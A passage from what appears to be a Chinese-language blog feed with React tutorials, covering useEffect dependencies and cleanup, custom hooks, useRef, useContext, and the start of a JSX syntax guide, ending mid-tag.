依赖项的使用</h3><ul><li>跳过不必要的执行，只在 count 变化时，才执行相应的 effect</li><li><code>useEffect(()=&gt;{},[依赖项])</code> 依赖项的值变化才会执行 effect</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useEffect &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Counter = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> [loading, setLoading] = useState(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">`当前已点击 <span class="subst">$&#123;count&#125;</span> 次`</span>;</span><br><span class="line">  &#125;, [count]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;计数器：&#123;count&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/</span>button&gt;</span><br><span class="line">      &lt;button onClick=&#123;() =&gt; setCount(!loading)&#125;&gt;切换 loading&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li><code>useEffect(()=&gt;{},[依赖项])</code> 依赖项可以指定某些状态变化再去执行副作用</li></ul><h2 id="useEffect-不要对依赖项撒谎"><a href="#useEffect-不要对依赖项撒谎" class="headerlink" title="useEffect-不要对依赖项撒谎"></a>useEffect-不要对依赖项撒谎</h2><ul><li>useEffect 完全指南：<a href="https://overreacted.io/zh-hans/a-complete-guide-to-useeffect/" target="_blank" rel="noopener">https://overreacted.io/zh-hans/a-complete-guide-to-useeffect/</a></li><li>useEffect 回调函数（effect）中用到的数据（比如，count）就是依赖数据，就应该出现在依赖项数组中</li><li>如果 useEffect 回调函数中用到了某个数据，但是，没有出现在依赖项数组中，就会导致一些 Bug 出现</li><li>所以，不要对 useEffect 的依赖撒谎</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 错误演示：</span></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.title = <span class="string">'点击了'</span> + count + <span class="string">'次'</span>;</span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;h1&gt;计数器：&#123;count&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">      &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+1&lt;/</span>button&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li>副作用中使用的状态，需要写在依赖项中</li></ul><h2 id="useEffect-依赖是一个空数组"><a href="#useEffect-依赖是一个空数组" class="headerlink" title="useEffect-依赖是一个空数组"></a>useEffect-依赖是一个空数组</h2><ol><li>useEffect 的第二个参数，还可以是一个<strong>空数组（[]）</strong><ol><li>表示只在组件第一次渲染后执行 effect</li><li>该 effect 只会在组件第一次渲染后执行，因此可以执行像事件绑定等只需要执行一次的操作。</li><li>相当于 class 组件的 componentDidMount 钩子函数的作用</li></ol></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> handleResize = <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">  <span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, handleResize);</span><br><span class="line">&#125;, []);</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>跟 useState Hook 一样，一个组件中也可以调用 useEffect Hook 多次</li><li>推荐：<strong>一个 useEffect 只处理一个功能，有多个功能时，使用多次 useEffect</strong></li></ul><h2 id="useEffect-清除副作用"><a href="#useEffect-清除副作用" class="headerlink" title="useEffect-清除副作用"></a>useEffect-清除副作用</h2><ul><li>effect 的<strong>返回值</strong>是可选的，可省略。也可以返回一个<strong>清理函数</strong>，用来执行事件解绑等清理操作</li><li>清理函数的执行时机：<ul><li><strong>清理函数</strong>会在组件卸载时以及下一次副作用回调函数调用的时候执行，用于清除上一次的副作用。</li><li>如果依赖项为空数组，那么会在组件卸载时会执行。相当于组件的<code>componetWillUnmount</code></li></ul></li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> handleResize = <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">  <span class="built_in">window</span>.addEventListener(<span class="string">'resize'</span>, handleResize);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这个返回的函数，会在该组件卸载时来执行</span></span><br><span class="line">  <span class="comment">// 因此，可以去执行一些清理操作，比如，解绑 window 的事件、清理定时器 等</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">window</span>.removeEventListener(<span class="string">'resize'</span>, handleResize);</span><br><span class="line">&#125;, []);</span><br></pre></td></tr></table></figure><h2 id="useEffect-使用总结"><a href="#useEffect-使用总结" class="headerlink" title="useEffect-使用总结"></a>useEffect-使用总结</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 触发时机：1 第一次渲染会执行 2 每次组件重新渲染都会再次执行</span></span><br><span class="line"><span class="comment">// componentDidMount + ComponentDidUpdate</span></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2（使用频率最高）</span></span><br><span class="line"><span class="comment">// 触发时机：只在组件第一次渲染时执行</span></span><br><span class="line"><span class="comment">// componentDidMount</span></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;, []);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3（使用频率最高）</span></span><br><span class="line"><span class="comment">// 触发时机：1 第一次渲染会执行 2 当 count 变化时会再次执行</span></span><br><span class="line"><span class="comment">// componentDidMount + componentDidUpdate（判断 count 有没有改变）</span></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;, [count]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 返回值函数的执行时机：组件卸载时</span></span><br><span class="line">  <span class="comment">// 在返回的函数中，清理工作</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 相当于 componentWillUnmount</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;, []);</span><br><span class="line"></span><br><span class="line">useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 返回值函数的执行时机：1 组件卸载时 2 count 变化时</span></span><br><span class="line">  <span class="comment">// 在返回的函数中，清理工作</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;;</span><br><span class="line">&#125;, [count]);</span><br></pre></td></tr></table></figure><h1 id="Hooks进阶"><a href="#Hooks进阶" class="headerlink" title="Hooks进阶"></a>Hooks进阶</h1><h3 id="自定义hook"><a href="#自定义hook" class="headerlink" title="自定义hook"></a>自定义hook</h3><ul><li>函数需要是 <code>use</code> 开头，否则react不认为是 <code>hooks</code></li><li>自定义 <code>hook</code> 就是对状态和逻辑的封装，将来可以复用</li></ul><p>例：</p><ul><li>在App.js组件实现一个记录鼠标移动坐标的功能</li><li>把实现功能的逻辑和状态封装在一个函数中</li><li>将函数放在一个单独的js文件中，导入给App.js使用</li></ul><p><strong>未封装前</strong></p><p><code>App.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState, useEffect &#125; <span class="keyword">from</span> <span class="string">"react"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> [mouse, setMouse] = useState(&#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span> &#125;)</span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> handelMouseMove = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      setMouse(&#123; <span class="attr">x</span>: e.pageX, <span class="attr">y</span>: e.pageY &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">'mousemove'</span>, handelMouseMove)</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">document</span>.removeEventListener(<span class="string">'mousemove'</span>, handelMouseMove)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, [])</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"app"</span>&gt;</span>根组件 &#123;JSON.stringify(mouse)&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App</span><br></pre></td></tr></table></figure><p><strong>封装hooks之后</strong></p><p><code>hook.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState, useEffect &#125; <span class="keyword">from</span> <span class="string">"react"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> useMouse = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [mouse, setMouse] = useState(&#123; <span class="attr">x</span>: <span class="number">0</span>, <span class="attr">y</span>: <span class="number">0</span> &#125;)</span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> handelMouseMove = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">      setMouse(&#123; <span class="attr">x</span>: e.pageX, <span class="attr">y</span>: e.pageY &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">'mousemove'</span>, handelMouseMove)</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">document</span>.removeEventListener(<span class="string">'mousemove'</span>, handelMouseMove)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, [])</span><br><span class="line">  <span class="keyword">return</span> mouse</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>App.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useMouse &#125; <span class="keyword">from</span> <span class="string">"./hooks"</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> mouse = useMouse()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">"app"</span>&gt;</span>根组件 &#123;JSON.stringify(mouse)&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App</span><br></pre></td></tr></table></figure><h3 id="useRef-基本使用"><a href="#useRef-基本使用" class="headerlink" title="useRef-基本使用"></a>useRef-基本使用</h3><blockquote><p>使用<code>useRef</code>可以获取dom元素，组件也可以通过它获取。</p></blockquote><ul><li>导入 <code>useRef</code> 函数从 <code>react</code> 中</li><li>创建ref对象 <code>const ref = useRef(null)</code></li><li>给需要获取的标签上 <code>ref={ref}</code> 绑定ref对象</li><li>渲染完毕后，可以通过 <code>ref.current</code> 获取dom元素</li></ul><p>例：组件初始化自动获取焦点功能</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useRef, useEffect &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> inputRef = useRef(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// input DOM元素</span></span><br><span class="line">    <span class="built_in">console</span>.log(inputRef.current); </span><br><span class="line">    <span class="comment">// input 获取焦点</span></span><br><span class="line">    inputRef.current.focus()</span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div className=<span class="string">"app"</span>&gt;</span><br><span class="line">      根组件：</span><br><span class="line">      &lt;input type=<span class="string">"text"</span> ref=&#123;inputRef&#125; /&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default App;</span></span><br></pre></td></tr></table></figure><h3 id="useContext-基本使用"><a href="#useContext-基本使用" class="headerlink" title="useContext-基本使用"></a>useContext-基本使用</h3><p><strong>大致步骤：</strong></p><ul><li>通过 <code>createContext</code> 创建context对象</li><li>通过 <code>Provider</code> 组件包裹根组件，注入数据</li><li>在 <code>后代</code> 组件中使用 <code>useContext</code> 使用数据</li></ul><ol><li><p>通过 <code>createContext</code> 创建context对象</p><p><code>context.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createContext &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> createContext(&#123;&#125;)</span><br></pre></td></tr></table></figure></li><li><p>通过 <code>Provider</code> 组件包裹根组件，注入数据</p><p><code>App.jsx</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> Context <span class="keyword">from</span> <span class="string">"./context"</span>;</span><br><span class="line"><span class="keyword">import</span> Child <span class="keyword">from</span> <span class="string">'./Child'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> App = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;Context.Provider value=&#123;count&#125;&gt;</span><br><span class="line">      &lt;div className=<span class="string">"app"</span>&gt;</span><br><span class="line">        根组件：&#123;count&#125; &lt;button onClick=&#123;() =&gt; setCount(count + <span class="number">1</span>)&#125;&gt;打豆豆&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">        &lt;hr /</span>&gt;</span><br><span class="line">        &lt;Child /&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>Context.Provider&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> App;</span><br></pre></td></tr></table></figure></li><li><p>在 <code>后代</code> 组件中使用 <code>useContext</code> 使用数据</p><p><code>Child.jsx</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useContext &#125; <span class="keyword">from</span> <span class="string">"react"</span></span><br><span class="line"><span class="keyword">import</span> Context <span class="keyword">from</span> <span class="string">'./context'</span></span><br><span class="line"><span class="keyword">const</span> Child = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> count = useContext(Context)</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>后代组件：&#123;count&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Child</span><br></pre></td></tr></table></figure></li></ol><p><strong>总结：</strong></p><ul><li>创建context对象和<code>Provider</code>注入数据和之前一样，使用数据只需要 <code>useContext</code> 即可。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Hooks-介绍&quot;&gt;&lt;a href=&quot;#Hooks-介绍&quot; class=&quot;headerlink&quot; title=&quot;Hooks-介绍&quot;&gt;&lt;/a&gt;Hooks-介绍&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;hooks 解释&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Hooks&lt;/code&gt;：钩子、钓
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="hooks" scheme="//www.shen.ee/tags/hooks/"/>
    
      <category term="reacthooks" scheme="//www.shen.ee/tags/reacthooks/"/>
    
      <category term="useState" scheme="//www.shen.ee/tags/useState/"/>
    
      <category term="useEffect" scheme="//www.shen.ee/tags/useEffect/"/>
    
      <category term="useRef" scheme="//www.shen.ee/tags/useRef/"/>
    
      <category term="useContext" scheme="//www.shen.ee/tags/useContext/"/>
    
  </entry>
  
  <entry>
    <title>JSX语法学习</title>
    <link href="//www.shen.ee/article/34118.html"/>
    <id>//www.shen.ee/article/34118.html</id>
    <published>2022-06-15T02:38:39.000Z</published>
    <updated>2022-06-22T06:24:25.995Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JSX-基本概念"><a href="#JSX-基本概念" class="headerlink" title="JSX 基本概念"></a>JSX 基本概念</h2><blockquote><p><code>JSX</code> 是 <code>JavaScript XML</code> 的简写，表示了在 JavaScript 中书写 XML 格式的代码。它是 <code>React</code> 的核心内容，它可以让我们在 <code>React</code> 中创建元素更加简单，更加直观，提高开发效率。</p></blockquote><ul><li>什么是JSX？<ul><li><code>JS</code> 扩展语法，可以在 <code>JS</code> 中书写 <code>XML</code> 语法</li></ul></li><li>JSX的优点？<ul><li>可以更加 <code>简洁、直观、高效</code> 的声明 UI 界面</li></ul></li></ul><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>我们可以在 babel 的网站，在线测试 <a href="https://www.babeljs.cn/" target="_blank" rel="noopener">babeljs</a> ，这个网站可以把 <code>JSX</code> 代码转换成 <code>JS</code> 代码 </p><p><img src="https://oss.iyouhun.com/img/md/image-20220607171437890.png" alt="image-20220607171437890"></p><p><strong>注意</strong>：<code>JSX</code> 是 <code>JavaScript</code> 的<strong>语法扩展</strong>，它无法在浏览器中直接使用，在 <code>create-react-app</code> 脚手架中内置了 <code>@babel/plugin-transform-react-jsx</code> 插件来解析它，成为 <code>JavaScript</code> 的标准语法。</p><h2 id="JSX-基本使用"><a href="#JSX-基本使用" class="headerlink" title="JSX 基本使用"></a>JSX 基本使用</h2><ul><li>导入 <code>react-dom</code></li><li>使用 <code>JSX</code> 创建元素</li><li>使用 <code>react-dom</code> 渲染</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;div id=<span class="string">"box"</span>&gt;</span><br><span class="line">    &lt;h1&gt;JSX&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">    &lt;ul&gt;</span></span><br><span class="line"><span class="regexp">      &lt;li&gt;tom&lt;/</span>li&gt;</span><br><span class="line">      &lt;li&gt;jack&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">      &lt;li&gt;tony&lt;/</span>li&gt;</span><br><span class="line">    &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">ReactDom.render(element, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure><p>上述代码运行成功，现在 <strong><code>React17x</code></strong> 可以不必导入<code>React</code>包，因为在 <code>babel</code> 转换的时候自动导入了创建 React 元素的依赖。但是如果你使用 <strong><code>React16x</code></strong> 那么你还需要手动导入 <strong><code>React</code></strong> ，如何验证？安装下低版本的 <code>React</code> 包即可。</p><p><strong>总结</strong></p><ul><li>导入 <code>react-dom</code> 使用 <code>JSX</code> 创建元素 使用 <code>react-dom</code> 渲染元素</li><li><code>17x</code> 版本的 <code>React</code> 不需要导入，如果将来遇见 <code>低版本</code> 是需要导入的。</li></ul><p><strong>补充</strong></p><ul><li><code>vscode settings.json</code> 加上 在 react 中使用 ement 语法提示创建标签</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"emmet.includeLanguages"</span>: &#123;</span><br><span class="line">    <span class="string">"javascript"</span>: <span class="string">"javascriptreact"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JSX-的注意事项"><a href="#JSX-的注意事项" class="headerlink" title="JSX 的注意事项"></a>JSX 的注意事项</h2><h3 id="使用细节"><a href="#使用细节" class="headerlink" title="使用细节"></a>使用细节</h3><ul><li>特殊属性写法 <strong><code>className</code> <code>htmlFor</code></strong></li><li>没有内容的节点可以使用 <code>单标签</code></li><li>必需有根节点，可以使用 <code>&lt;&gt;&lt;/&gt;</code> 幽灵标签，其实是 <code>&lt;React.Fragment&gt;&lt;/React.Fragment&gt;</code> 简写</li><li>如果 <code>JSX</code> 有换行，最好使用 <code>()</code> 包裹</li></ul><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><ul><li>特殊属性</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class ---&gt; className    for ---&gt; htmlFor  特殊属性</span></span><br><span class="line">&lt;div className=<span class="string">"box"</span>&gt;</span><br><span class="line">  &lt;label htmlFor=<span class="string">"ck"</span>&gt;&lt;/label&gt;</span><br><span class="line">  &lt;input id=<span class="string">"ck"</span> type=<span class="string">"checkbox"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure><ul><li>可单标签</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;span className="icon-edit"&gt;&lt;/span&gt; 没内容可以写成单标签形势</span></span><br><span class="line">&lt;span className=<span class="string">"icon-edit"</span> /&gt;</span><br></pre></td></tr></table></figure><ul><li>有根节点</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 使用 React.Fragment 代码片段</span></span><br><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> ReactDom <span class="keyword">from</span> <span class="string">'react-dom'</span>;</span><br><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;React.Fragment&gt;</span><br><span class="line">    &lt;div&gt;header&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div&gt;footer&lt;/</span>div&gt;</span><br><span class="line">  &lt;<span class="regexp">/React.Fragment&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br><span class="line"><span class="regexp">ReactDom.render(element, document.getElementById('root'));</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 